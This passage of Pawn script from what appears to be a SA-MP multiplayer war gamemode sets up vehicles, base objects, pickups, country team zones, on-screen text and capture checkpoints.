AddStaticVehicleEx(432,-230.0387000,2665.2788000,62.7025000,180.0000000,-1,-1,15); //Rhino
AddStaticVehicleEx(470,-210.3585000,2594.6685000,62.5215000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-216.6688000,2594.6206000,62.5215000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-231.6900000,2594.9990000,62.5215000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-238.0264000,2594.7847000,62.5215000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(522,-222.2656000,2594.4702000,62.1418000,0.0000000,-1,-1,15); //NRG-500
AddStaticVehicleEx(522,-225.6065000,2594.2671000,62.1418000,0.0000000,-1,-1,15); //NRG-500
AddStaticVehicleEx(468,-207.2616000,2594.4705000,62.3290000,0.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(468,-219.5487000,2594.4111000,62.3290000,0.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(468,-228.5758000,2594.6997000,62.3290000,0.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(468,-240.6769000,2594.6523000,62.3290000,0.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(447,-168.1360000,2661.8267000,63.3383000,90.0000000,-1,-1,15); //Seasparrow
AddStaticVehicleEx(433,-275.2636000,2681.4956000,63.1689000,0.0000000,-1,-1,15); //Barracks
AddStaticVehicleEx(427,-288.5317000,2680.4834000,62.6731000,0.0000000,-1,-1,15); //Enforcer
AddStaticVehicleEx(487,-310.2920000,2679.2478000,62.8618000,0.0000000,-1,-1,15); //Maverick
AddStaticVehicleEx(476,-280.9542000,2780.5664000,78.9457000,270.0000000,-1,-1,15); //Rustler
AddStaticVehicleEx(476,-263.9152000,2780.3096000,78.9457000,270.0000000,-1,-1,15); //Rustler
AddStaticVehicleEx(489,-202.1162000,2758.8455000,62.9102000,180.0000000,-1,-1,15); //Rancher
AddStaticVehicleEx(489,-197.7529000,2758.7898000,62.9102000,180.0000000,-1,-1,15); //Rancher
AddStaticVehicleEx(489,-206.8503000,2758.5710000,62.9102000,180.0000000,-1,-1,15); //Rancher	AddStaticVehicleEx(487,-296.8867000,2720.7676000,62.4636000,0.0000000,-1,-1,15); //Maverick
AddStaticVehicleEx(424,-239.2982000,2760.3140000,62.5033000,180.0000000,-1,-1,15); //BF Injection	AddStaticVehicleEx(424,-244.0184000,2760.3152000,62.5033000,180.0000000,-1,-1,15); //BF Injection	AddStaticVehicleEx(461,-248.6445000,2759.9172000,62.2193000,180.0000000,-1,-1,15); //PCJ-600	AddStaticVehicleEx(461,-250.7338000,2759.5046000,62.2193000,180.0000000,-1,-1,15); //PCJ-600
AddStaticVehicleEx(461,-253.3725000,2759.1584000,62.2193000,180.0000000,-1,-1,15);
CreateVehicle(425, -208.6198, 2725.8181, 63.3336, 180.3600, -1, -1, 100);
//Dubai Base
CreateDynamicObject(16094, 2833.24658, 1302.24011, 12.54434,   0.00000, 0.00000, 90.84002);
CreateDynamicObject(16094, 2833.54248, 1302.36951, 19.56901,   0.00000, 0.00000, 90.65999);
CreateDynamicObject(987, 2790.16870, 1207.08557, 9.83038,   0.00000, 0.00000, -179.21992);
CreateDynamicObject(987, 2790.04639, 1206.99365, 16.47668,   0.00000, 0.00000, -178.13982);
CreateDynamicObject(3444, 1031.03723, 2318.15527, 12.30885,   0.00000, 0.00000, -270.53992);
CreateDynamicObject(8209, 1016.70349, 2352.58960, 12.71659,   0.00000, 0.00000, -89.34002);
CreateDynamicObject(8209, 1065.40369, 2401.34888, 12.65829,   0.00000, 0.00000, -180.42004);
CreateDynamicObject(8210, 1114.99231, 2373.89941, 12.65629,   0.00000, 0.00000, -269.93973);
CreateDynamicObject(987, 1115.65295, 2346.13794, 9.81444,   0.00000, 0.00000, -0.90000);
CreateDynamicObject(3749, 1019.01074, 2293.30664, 15.41311,   0.00000, 0.00000, -89.94001);
CreateDynamicObject(8209, 1017.67578, 2237.00244, 12.64398,   0.00000, 0.00000, -89.76000);
CreateDynamicObject(8209, 1017.81274, 2137.43188, 12.67460,   0.00000, 0.00000, -90.00001);
CreateDynamicObject(8209, 1067.30029, 2088.54492, 12.69960,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8210, 1144.75647, 2089.17529, 12.68483,   0.00000, 0.00000, 1.14000);
CreateDynamicObject(8209, 1170.91675, 2139.18652, 12.70085,   0.00000, 0.00000, 91.37999);
CreateDynamicObject(3749, 1166.95972, 2193.91113, 14.58284,   0.00000, 0.00000, -48.42000);
CreateDynamicObject(8171, 1101.29492, 2109.55835, 9.92771,   0.00000, 0.00000, -89.51999);
CreateDynamicObject(8038, 1124.86548, 2145.53394, 29.43930,   0.00000, 0.00000, 90.65997);
CreateDynamicObject(9241, 1069.84802, 2148.00464, 10.91034,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(9241, 1044.92273, 2148.06177, 10.82392,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3268, 1085.78955, 2341.11597, 9.79139,   0.00000, 0.00000, 89.82000);
CreateDynamicObject(3268, 1061.66992, 2341.21069, 9.79139,   0.00000, 0.00000, 89.82000);
//Vehicles//
CreateVehicle(476, 1029.2650, 2275.2378, 11.7817, -179.5800, -1, -1, 100);
CreateVehicle(476, 1044.9984, 2275.5432, 11.7536, -179.5800, -1, -1, 100);
CreateVehicle(447, 1069.9446, 2147.9856, 12.3376, 0.0000, -1, -1, 100);
CreateVehicle(425, 1044.3331, 2146.5598, 13.3382, 0.0000, -1, -1, 100);
CreateVehicle(520, 1157.5548, 2117.5935, 11.6356, 90.6000, -1, -1, 100);
CreateVehicle(520, 1157.9260, 2102.5183, 11.6356, 90.6000, -1, -1, 100);
CreateVehicle(432, 1092.7152, 2341.9219, 10.6799, -179.7600, -1, -1, 100);
CreateVehicle(432, 1083.5223, 2341.3611, 10.6799, -179.7600, -1, -1, 100);
CreateVehicle(470, 1068.4005, 2340.2427, 10.5287, -180.9599, -1, -1, 100);
CreateVehicle(470, 1062.7490, 2340.0630, 10.5287, -180.9599, -1, -1, 100);
CreateVehicle(470, 1056.0117, 2340.4741, 10.5287, -180.9599, -1, -1, 100);
CreateVehicle(522, 1135.9188, 2265.0359, 10.2242, 88.3200, -1, -1, 100);
CreateVehicle(522, 1135.8522, 2262.1648, 10.2242, 88.3200, -1, -1, 100);
CreateVehicle(522, 1135.9539, 2259.6372, 10.2242, 88.3200, -1, -1, 100);
CreateVehicle(490, 1114.6835, 2262.0332, 10.8305, 0.0000, -1, -1, 100);
CreateVehicle(490, 1107.5157, 2262.1912, 10.8305, -0.4200, -1, -1, 100);
CreateVehicle(528, 1114.4868, 2298.3357, 10.7635, 90.5400, -1, -1, 100);
CreateVehicle(528, 1114.4041, 2304.8547, 10.7635, 91.3200, -1, -1, 100);
//Malaysia Base
CreateDynamicObject(8136, 1038.31836, 1323.88403, 14.68750,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18850, 1084.73608, 1236.87109, -2.37476,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18850, 1084.81091, 1262.57532, -2.37476,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18850, 1084.79736, 1288.14734, -2.37476,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8171, 1038.57166, 1293.91272, 19.56207,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8613, 1062.49341, 1309.31360, 16.28159,   0.00000, 0.00000, 88.74001);
CreateDynamicObject(8613, 1070.21191, 1300.93579, 8.61434,   0.00000, 0.00000, 89.81998);
CreateDynamicObject(3268, 1165.87427, 1303.37488, 9.79285,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3268, 1165.79980, 1261.63098, 9.79285,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(4832, 1130.16772, 1220.03979, 49.76311,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3749, 1139.87976, 1363.92517, 15.61799,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19377, 1152.50952, 1362.21411, 10.02655,   0.00000, 0.00000, 90.60001);
CreateDynamicObject(8613, 1102.61792, 1309.51501, 11.90335,   0.00000, 0.00000, 89.81998);
CreateDynamicObject(8613, 1093.32568, 1315.95044, 11.90335,   0.00000, 0.00000, -89.40003);
CreateDynamicObject(16093, 1166.61108, 1332.47839, 13.65432,   0.00000, 0.00000, -89.39998);
CreateDynamicObject(16638, 1165.69946, 1332.43152, 11.89326,   0.00000, 0.00000, -89.34000);
CreateDynamicObject(3749, 1067.54871, 1363.18530, 15.61799,   0.00000, 0.00000, 0.48000);
CreateDynamicObject(3279, 1093.38977, 1357.05273, 9.62510,   0.00000, 0.00000, -90.72002);
CreateDynamicObject(3279, 1066.23669, 1229.33960, 9.62510,   0.00000, 0.00000, -268.19998);
CreateDynamicObject(3279, 1165.10425, 1231.32190, 9.62510,   0.00000, 0.00000, -268.19998);
CreateDynamicObject(3279, 1107.71082, 1338.07776, 9.62510,   0.00000, 0.00000, -356.93997);
//Vehicles//
CreateVehicle(520, 1046.1759, 1235.1833, 21.1689, 0.0000, -1, -1, 100);
CreateVehicle(520, 1031.0544, 1235.4039, 21.1689, 0.0000, -1, -1, 100);
CreateVehicle(487, 1085.5179, 1287.5104, 11.0275, 91.2000, -1, -1, 100);
CreateVehicle(447, 1084.9744, 1262.6713, 10.6773, 92.2800, -1, -1, 100);
CreateVehicle(425, 1086.6208, 1236.9763, 11.4196, 90.6000, -1, -1, 100);
CreateVehicle(432, 1163.9871, 1254.8379, 10.6156, 88.6200, -1, -1, 100);
CreateVehicle(432, 1164.4580, 1265.2279, 10.6156, 88.6200, -1, -1, 100);
CreateVehicle(470, 1164.0646, 1309.6903, 10.5682, 90.7800, -1, -1, 100);
CreateVehicle(470, 1163.8745, 1304.3741, 10.5682, 90.7800, -1, -1, 100);
CreateVehicle(470, 1163.7290, 1298.6556, 10.5682, 90.7800, -1, -1, 100);
CreateVehicle(490, 1105.3204, 1268.4440, 10.9806, -88.8000, -1, -1, 100);
CreateVehicle(490, 1104.8936, 1275.0189, 10.9806, -88.8000, -1, -1, 100);
CreateVehicle(522, 1103.2069, 1260.0596, 10.2701, -88.5000, -1, -1, 100);
CreateVehicle(522, 1103.2264, 1258.1595, 10.2701, -87.5400, -1, -1, 100);
CreateVehicle(522, 1103.3654, 1256.3019, 10.2701, -87.2400, -1, -1, 100);
///////////////////////////////////////////////////////////////////////////////

	ChinaP = CreatePickup(1210,2,-148.4453,1110.0249,19.7500, -1);//China
	IP = CreatePickup(1210,2,-797.5327,1556.2026,27.1244, -1);//India
	PP = CreatePickup(1210,2,-685.4737,939.6329,13.6328, -1);//Pak
	NP = CreatePickup(1210,2,-1489.2524, 2545.7410, 56.4080, -1);//Nepal
	DP = CreatePickup(1210,2,1099.6589, 2274.6606, 10.6414, -1);//Dubai
	UP = CreatePickup(1210,2,-252.4021,2603.1230,62.8582, -1); //USA pickup
    MP = CreatePickup(1210,2,1160.6196, 1333.3407, 10.8175, -1); //Malaysia pickup
    CreatePickup(1314, 1, -36.5458, 2347.6426, 24.1406, -1); // pickup
    CreatePickup(1314, 1, 260.0900,2889.5242,11.1854, -1); // pickup
    CreatePickup(1314, 1, 239.5721,1859.1677,14.0840, -1); // pickup
    CreatePickup(1314, 1, -551.6992,2593.0771,53.9348, -1); // pickup
    CreatePickup(1314, 1,670.9215,1705.4658,7.1875, -1); // pickup
    CreatePickup(1314, 1,221.0856,1422.6615,10.5859, -1); // pickup
    CreatePickup(1314, 1,558.9932,1221.8896,11.7188, -1); // pickup
    CreatePickup(1314, 1,588.3246,875.7402,-42.4973, -1); // pickup
    CreatePickup(1314, 1,-314.8433,1773.9176,43.6406, -1); // pickup
    CreatePickup(1314, 1,-311.0136,1542.9733,75.5625, -1); // pickup
    CreatePickup(1314, 1,408.1432,2450.1574,16.5, -1); // pickup
    CreatePickup(1314, 1,-1377.5,1492.154,11.199999809265, -1); // pickup
    CreatePickup(1314, 1,-1471.1574, 1863.4124, 32.599998474121, -1); // pickup
    CreatePickup(1314, 1,-1208.154,1834.5,41.900001525879, -1); // pickup
    CreatePickup(1314, 1,-1299.144,2519.5,87.300003051758, -1); // pickup
    CreatePickup(1314, 1,-782.157,2762.5,45.700000762939, -1); // pickup
    CreatePickup(1314, 1,1047.0999755859,1012.12452,11.1, -1); // pickup


	GZ_ZONE1 = GangZoneCreate(-353.515625,2574.21875,-113.28125,2796.875); //USA
	GZ_ZONE2 = GangZoneCreate(-788.4334,773.8838, -422.0885,1014.2616); // Pakistan
	GZ_ZONE3 = GangZoneCreate(-1599.869, 2545.777, -1389.667, 2697.589); //Nepal
	GZ_ZONE4 = GangZoneCreate(-309.375,1024.21875,103.125,1211.71875); //China
	GZ_ZONE5 = GangZoneCreate(-875.8406, 1389.667, -607.2495, 1623.225); //India
	GZ_ZONE6 = GangZoneCreate(1042.96875,2085.9375,1166.015625,2355.46875); //Dubai
	GZ_ZONE7 = GangZoneCreate(1007.8125,1207.03125,1189.453125,1376.953125); //Malaysia
	
	//=====xMx4LiFe textdraws======//
//==============================================================================
Rules = TextDrawCreate(1.000000,216.000000,"");
TextDrawAlignment(Rules,0);
TextDrawBackgroundColor(Rules,0x000000ff);
TextDrawFont(Rules,2);
TextDrawLetterSize(Rules,0.199999,0.899999);
TextDrawColor(Rules,0xffffffff);
TextDrawSetOutline(Rules,1);
TextDrawSetProportional(Rules,1);
TextDrawSetShadow(Rules,1);

StartLogo = TextDrawCreate(0.000000, 0.000000, "");
TextDrawBackgroundColor(StartLogo, 255);
TextDrawFont(StartLogo, 4);
TextDrawLetterSize(StartLogo, 0.500000, 1.000000);
TextDrawColor(StartLogo, -1);
TextDrawSetOutline(StartLogo, 0);
TextDrawSetProportional(StartLogo, 1);
TextDrawSetShadow(StartLogo, 1);
TextDrawUseBox(StartLogo, 1);
TextDrawBoxColor(StartLogo, 255);
TextDrawTextSize(StartLogo, 640.000000, 480.000000);
TextDrawSetSelectable(StartLogo, 0);
/*
startbox = TextDrawCreate(460.213684, 164.249969, "usebox");
TextDrawLetterSize(startbox, 0.000000, 11.674075);
TextDrawTextSize(startbox, 156.360183, 0.000000);
TextDrawAlignment(startbox, 1);
TextDrawColor(startbox, 0);
TextDrawUseBox(startbox, true);
TextDrawBoxColor(startbox, 102);
TextDrawSetShadow(startbox, 0);
TextDrawSetOutline(startbox, 0);
TextDrawFont(startbox, 0);

welcome = TextDrawCreate(197.716445, 167.416732, "~r~___________Welcome___________");
TextDrawLetterSize(welcome, 0.363791, 1.967499);
TextDrawAlignment(welcome, 1);
TextDrawColor(welcome, -1);
TextDrawSetShadow(welcome, 2);
TextDrawSetOutline(welcome, 0);
TextDrawBackgroundColor(welcome, 51);
TextDrawFont(welcome, 2);
TextDrawSetProportional(welcome, 1);

to = TextDrawCreate(297.979553, 193.666656, "~b~To");
TextDrawLetterSize(to, 0.449999, 1.600000);
TextDrawAlignment(to, 1);
TextDrawColor(to, -1);
TextDrawSetShadow(to, 0);
TextDrawSetOutline(to, 1);
TextDrawBackgroundColor(to, 51);
TextDrawFont(to, 2);
TextDrawSetProportional(to, 1);

advance = TextDrawCreate(171.478759, 214.666732, "~r~COD8 - Asia at War");
TextDrawLetterSize(advance, 0.482795, 2.486669);
TextDrawAlignment(advance, 1);
TextDrawColor(advance, -1);
TextDrawSetShadow(advance, 0);
TextDrawSetOutline(advance, 1);
TextDrawBackgroundColor(advance, 51);
TextDrawFont(advance, 2);
TextDrawSetProportional(advance, 1);

copyright = TextDrawCreate(207.086227, 253.166717, "~b~Asia at War [EW] All Rights Reserved");
TextDrawLetterSize(copyright, 0.278521, 1.518332);
TextDrawAlignment(copyright, 1);
TextDrawColor(copyright, -1);
TextDrawSetShadow(copyright, 0);
TextDrawSetOutline(copyright, 1);
TextDrawBackgroundColor(copyright, 51);
TextDrawFont(copyright, 2);
TextDrawSetProportional(copyright, 1);
*/

	//box textdraw
    mbox = TextDrawCreate(683.000000, 365.000000, "~n~~n~~n~~n~~n~~n~~n~");
    TextDrawBackgroundColor( mbox, 255);
    TextDrawFont(mbox, 1);
    TextDrawLetterSize(mbox, 0.969999, 1.600000);
    TextDrawColor(mbox, -1347440726);
    TextDrawSetOutline(mbox, 0);
    TextDrawSetProportional(mbox, 1);
    TextDrawSetShadow(mbox, 1);
    TextDrawUseBox(mbox, 1);
    TextDrawBoxColor(mbox, 0x00000066);
    TextDrawTextSize(mbox, 470.000000, 99.000000);
    TextDrawShowForAll(mbox);

    //strings textdraw
    Message = TextDrawCreate(473.000000, 368.000000, "");
    TextDrawBackgroundColor(Message, 0x00000033);
    TextDrawFont(Message, 1);
    TextDrawLetterSize(Message, 0.199999,1.200000);
    TextDrawColor(Message, -1);
    TextDrawSetOutline(Message, 0);
    TextDrawSetProportional(Message, 1);
    TextDrawSetShadow(Message, 1);
    TextDrawShowForAll(Message);





	E = TextDrawCreate(204.000000, 250.000000, "Pakistan");
	TextDrawBackgroundColor(E, 255);
	TextDrawFont(E, 2);
	TextDrawLetterSize(E, 0.500, 2.500);
	TextDrawColor(E, TEAM_PAKISTAN_COLOR);
	TextDrawSetOutline(E, 1);
	TextDrawSetProportional(E, 1);
	TextDrawSetShadow(E,1);

	A = TextDrawCreate(205.000000, 250.000000, "India");
	TextDrawBackgroundColor(A, 255);
	TextDrawFont(A, 2);
	TextDrawLetterSize(A, 0.500, 2.500);
	TextDrawColor(A, TEAM_INDIA_COLOR);
	TextDrawSetOutline(A, 1);
	TextDrawSetProportional(A, 1);
	TextDrawSetShadow(A,1);

	S = TextDrawCreate(205.000000, 250.000000, "China");
	TextDrawBackgroundColor(S, 255);
	TextDrawFont(S, 2);
	TextDrawLetterSize(S, 0.500, 2.500);
	TextDrawColor(S, TEAM_CHINA_COLOR);
	TextDrawSetOutline(S, 1);
	TextDrawSetProportional(S, 1);
	TextDrawSetShadow(S,1);

	U = TextDrawCreate(205.000000, 250.000000, "USA");
	TextDrawBackgroundColor(U, 255);
	TextDrawFont(U, 2);
	TextDrawLetterSize(U, 0.500, 2.500);
	TextDrawColor(U, TEAM_USA_COLOR);
	TextDrawSetOutline(U, 1);
	TextDrawSetProportional(U, 1);
	TextDrawSetShadow(U,1);

	A2 = TextDrawCreate(205.000000, 250.000000, "Nepal");
	TextDrawBackgroundColor(A2, 255);
	TextDrawFont(A2, 2);
	TextDrawLetterSize(A2, 0.500, 2.500);
	TextDrawColor(A2, TEAM_ZONE_NEPAL_COLOR);
	TextDrawSetOutline(A2, 1);
	TextDrawSetProportional(A2, 1);
	TextDrawSetShadow(A2,1);
	
	Tur = TextDrawCreate(205.000000, 250.000000, "Dubai");
	TextDrawBackgroundColor(Tur, 255);
	TextDrawFont(Tur, 2);
	TextDrawLetterSize(Tur, 0.500, 2.500);
	TextDrawColor(Tur, TEAM_DUBAI_COLOR);
	TextDrawSetOutline(Tur, 1);
	TextDrawSetProportional(Tur, 1);
	TextDrawSetShadow(Tur,1);
	
	ML = TextDrawCreate(205.000000, 250.000000, "Malaysia");
	TextDrawBackgroundColor(ML, 255);
	TextDrawFont(ML, 2);
	TextDrawLetterSize(ML, 0.500, 2.500);
	TextDrawColor(ML, TEAM_ML_COLOR);
	TextDrawSetOutline(ML, 1);
	TextDrawSetProportional(ML, 1);
	TextDrawSetShadow(ML,1);


	Web = TextDrawCreate(485.000000, 10.000000, "");
	TextDrawBackgroundColor(Web, 255);
	TextDrawFont(Web, 2);
	TextDrawLetterSize(Web, 0.500, 1.000);
	TextDrawColor(Web, -1);
	TextDrawSetOutline(Web, 1);
	TextDrawSetProportional(Web, 1);
	TextDrawSetShadow(Web,1);

	UsePlayerPedAnims();
	DisableInteriorEnterExits();

    Star[0] = TextDrawCreate(485.000000, 100.000000, "]");
	TextDrawLetterSize(Star[0], 0.449999, 1.600000);
	TextDrawAlignment(Star[0], 1);
	TextDrawColor(Star[0], 0xFF0000AA);
	TextDrawSetShadow(Star[0], 0);
	TextDrawSetOutline(Star[0], 1);
	TextDrawBackgroundColor(Star[0], 51);
	TextDrawFont(Star[0], 2);
	TextDrawSetProportional(Star[0], 1);

	Star[1] = TextDrawCreate(496.000000, 100.000000, "]");
	TextDrawLetterSize(Star[1], 0.449999, 1.600000);
	TextDrawAlignment(Star[1], 1);
	TextDrawColor(Star[1], 0xFF0000AA);
	TextDrawSetShadow(Star[1], 0);
	TextDrawSetOutline(Star[1], 1);
	TextDrawBackgroundColor(Star[1], 51);
	TextDrawFont(Star[1], 2);
	TextDrawSetProportional(Star[1], 1);

	Star[2] = TextDrawCreate(507.000000, 100.000000, "]");
	TextDrawLetterSize(Star[2], 0.449999, 1.600000);
	TextDrawAlignment(Star[2], 1);
	TextDrawColor(Star[2], 0xFF0000AA);
	TextDrawSetShadow(Star[2], 0);
	TextDrawSetOutline(Star[2], 1);
	TextDrawBackgroundColor(Star[2], 51);
	TextDrawFont(Star[2], 2);
	TextDrawSetProportional(Star[2], 1);

	Star[3] = TextDrawCreate(518.000000, 100.000000, "]");
	TextDrawLetterSize(Star[3], 0.449999, 1.600000);
	TextDrawAlignment(Star[3], 1);
	TextDrawColor(Star[3], 0xFF0000AA);
	TextDrawSetShadow(Star[3], 0);
	TextDrawSetOutline(Star[3], 1);
	TextDrawBackgroundColor(Star[3], 51);
	TextDrawFont(Star[3], 2);
	TextDrawSetProportional(Star[3], 1);

	Star[4] = TextDrawCreate(529.000000, 100.000000, "]");
	TextDrawLetterSize(Star[4], 0.449999, 1.600000);
	TextDrawAlignment(Star[4], 1);
	TextDrawColor(Star[4], 0xFF0000AA);
	TextDrawSetShadow(Star[4], 0);
	TextDrawSetOutline(Star[4], 1);
	TextDrawBackgroundColor(Star[4], 51);
	TextDrawFont(Star[4], 2);
	TextDrawSetProportional(Star[4], 1);

	Star[5] = TextDrawCreate(540.000000, 100.000000, "]");
	TextDrawLetterSize(Star[5], 0.449999, 1.600000);
	TextDrawAlignment(Star[5], 1);
	TextDrawColor(Star[5], 0xFF0000AA);
	TextDrawSetShadow(Star[5], 0);
	TextDrawSetOutline(Star[5], 1);
	TextDrawBackgroundColor(Star[5], 51);
	TextDrawFont(Star[5], 2);
	TextDrawSetProportional(Star[5], 1);

	Star[6] = TextDrawCreate(551.000000, 100.000000, "]");
	TextDrawLetterSize(Star[6], 0.449999, 1.600000);
	TextDrawAlignment(Star[6], 1);
	TextDrawColor(Star[6], 0xFF0000AA);
	TextDrawSetShadow(Star[6], 0);
	TextDrawSetOutline(Star[6], 1);
	TextDrawBackgroundColor(Star[6], 51);
	TextDrawFont(Star[6], 2);
	TextDrawSetProportional(Star[6], 1);

	Star[7] = TextDrawCreate(562.000000, 100.000000, "]");
	TextDrawLetterSize(Star[7], 0.449999, 1.600000);
	TextDrawAlignment(Star[7], 1);
	TextDrawColor(Star[7], 0xFF0000AA);
	TextDrawSetShadow(Star[7], 0);
	TextDrawSetOutline(Star[7], 1);
	TextDrawBackgroundColor(Star[7], 51);
	TextDrawFont(Star[7], 2);
	TextDrawSetProportional(Star[7], 1);

	Star[8] = TextDrawCreate(573.000000, 100.000000, "]");
	TextDrawLetterSize(Star[8], 0.449999, 1.600000);
	TextDrawAlignment(Star[8], 1);
	TextDrawColor(Star[8], 0xFF0000AA);
	TextDrawSetShadow(Star[8], 0);
	TextDrawSetOutline(Star[8], 1);
	TextDrawBackgroundColor(Star[8], 51);
	TextDrawFont(Star[8], 2);
	TextDrawSetProportional(Star[8], 1);

	Star[9] = TextDrawCreate(584.000000, 100.000000, "]");
	TextDrawLetterSize(Star[9], 0.449999, 1.600000);
	TextDrawAlignment(Star[9], 1);
	TextDrawColor(Star[9], 0xFF0000AA);
	TextDrawSetShadow(Star[9], 0);
	TextDrawSetOutline(Star[9], 1);
	TextDrawBackgroundColor(Star[9], 51);
	TextDrawFont(Star[9], 2);
	TextDrawSetProportional(Star[9], 1);

    ///Send Box Msg

    /*tBox = TextDrawCreate(570.000000, 420.000000, "_");
	TextDrawAlignment(tBox, 2);
	TextDrawBackgroundColor(tBox, 255);
	TextDrawFont(tBox, 1);
	TextDrawLetterSize(tBox, 0.500000, -12.000000);
	TextDrawColor(tBox, -1);
	TextDrawSetOutline(tBox, 0);
	TextDrawSetProportional(tBox, 1);
	TextDrawSetShadow(tBox, 1);
	TextDrawUseBox(tBox, 1);
	TextDrawBoxColor(tBox, 83);
	TextDrawTextSize(tBox, 0.000000, -190.000000);

    for(new line; line<15; line++)
        {
          format(MessageStr[line], 128, " ");
        }
        //-------------------
        Message[0] = TextDrawCreate(486.000000, 402.000000, MessageStr[0]);
        //-------------------
        Message[1] = TextDrawCreate(486.000000, 392.000000, MessageStr[1]);
        //-------------------
        Message[2] = TextDrawCreate(486.000000, 382.000000, MessageStr[2]);
        //-------------------
        Message[3] = TextDrawCreate(486.000000, 372.000000, MessageStr[3]);
        //-------------------
        Message[4] = TextDrawCreate(486.000000, 362.000000, MessageStr[4]);
        //-------------------
        Message[5] = TextDrawCreate(486.000000, 352.000000, MessageStr[5]);
        //-------------------
        Message[6] = TextDrawCreate(486.000000, 342.000000, MessageStr[6]);
        //-------------------
        Message[7] = TextDrawCreate(486.000000, 332.000000, MessageStr[7]);
        //-------------------
        Message[8] = TextDrawCreate(486.000000, 322.000000, MessageStr[8]);
        //-------------------
        for(new line; line<15; line++)
        {
          TextDrawLetterSize(Message[line], 0.210000, 1.000000);
          TextDrawSetShadow(Message[line], 1);
          TextDrawAlignment(Message[line], 1);
          TextDrawFont(Message[line], 1);
          TextDrawShowForAll(Message[line]);
        }
        for(new line; line<15; line++)
        {
          TextDrawLetterSize(Message[line], 0.210000, 1.000000);
          TextDrawSetShadow(Message[line], 1);
          TextDrawAlignment(Message[line], 1);
          TextDrawBoxColor(Message[line], 0x000000FF);
          TextDrawFont(Message[line], 1);
          TextDrawShowForAll(Message[line]);
        }
 */
	//---------
    //snakes farm
    CP[SNAKE] = CreateDynamicCP(-36.5458, 2347.6426, 24.1406,3, -1,-1,-1,100.0);
    Zone[SNAKE] = GangZoneCreate(-62.5000000000005,2318.359375,23.4375,2390.625);
    //bayside sea shore
    CP[BAY] = CreateDynamicCP(260.0900,2889.5242,11.1854,3, -1,-1,-1,100.0);
    Zone[BAY] = GangZoneCreate(236.328125,2892.578125,292.96875,2943.359375);
    //area 51
    CP[BIG] = CreateDynamicCP(239.5721,1859.1677,14.0840,3, -1,-1,-1,100.0);
    Zone[BIG] = GangZoneCreate(-46.875,1697.265625,423.828125,2115.234375);
	//army MOTEL
	CP[ARMY] = CreateDynamicCP(-551.6992,2593.0771,53.9348,3, -1,-1,-1,100.0);
	Zone[ARMY] = GangZoneCreate(-617.1875,2531.25,-455.078125,2658.203125);
	//army petrol bunk
	CP[PETROL] = CreateDynamicCP(670.9215,1705.4658,7.1875,3, -1,-1,-1,100.0);
	Zone[PETROL] = GangZoneCreate(609.375,1652.34375,714.84375,1767.578125);
	//Oil Factory
	CP[OIL] = CreateDynamicCP(221.0856,1422.6615,10.5859,3, -1,-1,-1,100.0);
	Zone[OIL] = GangZoneCreate(95.703125,1339.84375,287.109375,1484.375);
	//Oil Station
	CP[DESERT] = CreateDynamicCP(558.9932,1221.8896,11.7188,3, -1,-1,-1,100.0);
	Zone[DESERT] = GangZoneCreate(529.296875,1205.078125,636.71875,1267.578125);
    //559.5272,1221.7778,11.7188
    //Quarry
	CP[QUARRY] = CreateDynamicCP(588.3246,875.7402,-42.4973,3, -1,-1,-1,100.0);
	Zone[QUARRY] = GangZoneCreate(439.453125,748.046875,863.28125,992.1875);
    //Desert Guest House
	CP[GUEST] = CreateDynamicCP(-314.8433,1773.9176,43.6406,3, -1,-1,-1,100.0);
	Zone[GUEST] = GangZoneCreate(-357.421875,1707.03125,-253.90625,1835.9375);
    //Big Ear
	CP[EAR] = CreateDynamicCP(-311.0136,1542.9733,75.5625,3, -1,-1,-1,100.0);
	Zone[EAR] = GangZoneCreate(-437.5,1513.671875,-244.140625,1636.71875);
	//Airport
	CP[AIRPORT] = CreateDynamicCP(408.1432,2450.1574,16.5,3, -1,-1,-1,100.0);
	Zone[AIRPORT] = GangZoneCreate(89.0625000000005,2418.75,466.40625,2617.96875);
	//Ship
	CP[SHIP] = CreateDynamicCP(-1377.5,1492.154,11.199999809265,3, -1,-1,-1,100.0);
	Zone[SHIP] = GangZoneCreate(-1448.057,1471.412,-1354.634,1506.446);
	//Gas Station
	CP[GAS] = CreateDynamicCP(-1471.1574, 1863.4124, 32.599998474121,3, -1,-1,-1,100.0);
	Zone[GAS] = GangZoneCreate(-1494.768, 1810.071, -1389.667, 1891.816);
	//restaurant
	CP[RES] = CreateDynamicCP(-1208.154,1834.5,41.900001525879,3, -1,-1,-1,100.0);
	Zone[RES] = GangZoneCreate(-1214.499, 1798.393, -1144.432, 1845.104);
	/*NPP
	CP[NPP] = CreateDynamicCP(1001.0014, 2669.4583, 14.7099,3, -1,-1,-1,100.0);
	Zone[NPP] = GangZoneCreate(896.484375, -2712.890625, 996.09375, -2625);*/
 	  //MOTEL
	CP[MOTEL] = CreateDynamicCP(2215.3335, -1150.6819, 1026.1809,3, -1,-1,-1,100.0);
	Zone[MOTEL ] = GangZoneCreate(1856.369995, 624.315979, 2000.369995, 784.315979);
	//Hospital
	CP[HOSPITAL] = CreateDynamicCP(1047.0999755859,1012.12452,11.1,3, -1,-1,-1,100.0);
	Zone[HOSPITAL] = GangZoneCreate(1004.297, 992.6194, 1156.11, 1156.11);
	//BATTLESHIP
	CP[BATTLESHIP] = CreateDynamicCP(-2472.7742, 1548.9401, 33.2473,3, -1,-1,-1,100.0);
	Zone[BATTLESHIP] = GangZoneCreate(-2531.25, 1500, -2285.15625, 1611.328125);

